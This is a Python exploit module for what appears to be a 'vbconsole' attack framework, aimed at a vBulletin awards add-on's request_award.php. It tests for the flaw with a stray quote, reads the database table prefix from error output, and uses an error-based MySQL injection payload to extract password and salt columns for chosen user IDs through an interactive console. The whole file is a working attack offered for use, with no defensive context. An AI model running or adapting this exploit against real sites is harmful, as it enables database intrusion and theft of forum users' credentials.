#!/usr/bin/env python
import re
import HTMLParser
import includes.requests
from includes.functions import *
from includes.termcolor import colored
from includes.prettytable import PrettyTable

def get_table_prefix(url, awardid):
	payload = {
		'do': 'submit',
		'name': 'award_id='+str(awardid),
		'award_request_reason': '0',
		'award_request_uid': "0'",
		'submit': 'Submit'
	}
	headers = {
		'X-Requested-With': 'XMLHttpRequest'
	}

	req = requests.post(url, data=payload, headers=headers)
	response = req.text
	
	prefix = re.search('INSERT INTO(.*)award_requests', response).group(1).strip()
	if len(prefix) != 0:
		print ('Table prefix found: '+prefix)
	else:
		print ('No table prefix was found.')

def check_if_vuln(url, awardid):
	payload = {
		'do': 'submit',
		'name': 'award_id='+str(awardid),
		'award_request_reason': '0',
		'award_request_uid': "0'",
		'submit': 'Submit'
	}
	headers = {
		'X-Requested-With': 'XMLHttpRequest'
	}

	req = requests.post(url, data=payload, headers=headers)
	if 'Database Error' in req.text:
		return True
	else:
		return False

def extract_data(url, awardid, userid, column, table):
	payload = {
		'do': 'submit',
		'name': 'award_id='+str(awardid),
		'award_request_reason': '0',
		'award_request_uid': """0' and (select 1 from (select count(*),concat((select(select concat(cast(concat("""+column+""") as char),0x7e)) from """+table+""" where userid="""+userid+""" limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND ''='#""",
		'submit': 'Submit'
	}
	headers = {
		'X-Requested-With': 'XMLHttpRequest'
	}
	
	req = requests.post(url, data=payload, headers=headers)
	response = req.text

	for search in response.split("\n"):
		if 'Duplicate entry' in search:
			result = search.strip()
			result = result.replace('<strong>MySQL Error</strong>', '')
			result = result.replace('Duplicate entry', '')
			result = result.replace('for key \'group_key\'', '')
			result = result.strip()
			result = result.strip(':')
			result = result.strip()
			result = result.strip('<br />')
			result = result.strip('\'')
			break
		elif 'MySQL Error' in search: 
			result = search.strip()
			result = result.replace('<strong>MySQL Error</strong>', '')
			result = result.strip()
			result = result.strip(':')
			result = result.strip()
			result = result.strip('<br />')
			break
	
	if result.endswith('~1'):
		result = result.strip('~1')
	elif result.endswith('~'):
		result = result.strip('~')

	return result

def initiate():
	exvars = [
		['HOST', 'Not Set', 'Host of target with forum path'],
		['TABLE', 'user', 'User table to extract data from'],
		['AWARDID', '1', 'Valid award ID'],
		['USERID', '1', 'Userid of user to extract data for. For multiple userids seperate with comma.'],
		['COLUMNS', 'password,salt', 'Columns to extract data for. Seperate with a comma!'],
		['SEPERATOR', ':', 'Seperator to seperate columns']
	]

	help = [
		['show vars', 'Shows variables needed to run exploit and their current values'],
		['set {VAR NAME} {VAR VALUE}', 'Sets variable {VAR NAME} to {VAR VALUE}'],
		['get prefix', 'Looks for MySQL table prefix'],
		['run', 'Run exploit'],
		['exit', 'Go back to vBconcole home']
	]

	print ('\nType help for more information')
	while True:
		try:
			yaasinput = raw_input('vbconsole('+colored('/exploits/yaas', 'red')+')> ')
			if yaasinput == 'exit':
				print ("Going back to home.")
				break
			elif yaasinput == 'help':
				helptable = PrettyTable()
				helptable.field_names = ["Command", "Description"]
				for helprows in help:
					helptable.add_row([helprows[0], helprows[1]])
				helptable.align["Command"] = "l"
				helptable.align["Description"] = "l"
				print (helptable)		
			elif yaasinput == 'show vars':
				print ("Variables needed to run exploit.\n")
				count = 0
				while count < len(exvars):
					print (exvars[count][0]+" = "+exvars[count][1]+" ("+exvars[count][2]+")")
					count += 1
			elif yaasinput[0:3] == 'set':
				setvar = yaasinput.split(' ')[1].upper()
				setval = yaasinput.split(' ')[2:]
				count = 0
				while count < len(exvars):
					if exvars[count][0] == setvar:
						exvars[count][1] = " ".join(setval)
						print (exvars[count][0]+" =>"+" "+" ".join(setval))
					count += 1
			elif yaasinput == 'get prefix':
				url = format_url(exvars[0][1])+"request_award.php"
				if(check_url(url)):
					if(check_if_vuln(url, exvars[2][1])):
						get_table_prefix(url, exvars[2][1])
					else:
						print("[-] Target does not seem to be vulnerable")
				else:
					print("[-] Url returned the following status code: "+str(get_status_code(url)))
			elif yaasinput == 'run':
				columns = exvars[4][1].split(',')
				userids = exvars[3][1].split(',')
				awardid = exvars[2][1]
				table = exvars[1][1]
				url = format_url(exvars[0][1])+"request_award.php"
				results = {}
				
				if(check_url(url)):
					if(check_if_vuln(url, awardid)):
						for userid in userids:						
							for col in columns:
								value = extract_data(url, awardid, userid, col, table)
								if userid in results:
									results[userid].update({col: value})
								else:
									results[userid] = {col: value}
						for values in results:
							data = '--------------------------------------------\n'
							data += 'Data for userid: '+values+"\n"
							line = []
							for rows in results[values]:
								data += rows+":"+results[values][rows]+"\n"
								line.append(results[values][rows])
							data += '\n'+":".join(line)+"\n"
							data += '--------------------------------------------\n\n'
							print(data)
								
					else:
						print("[-] Target does not seem to be vulnerable")
				else:
					print("[-] Url returned the following status code: "+str(get_status_code(url)))			
		except KeyboardInterrupt:
			print ("\nGoing back to home.")
			break
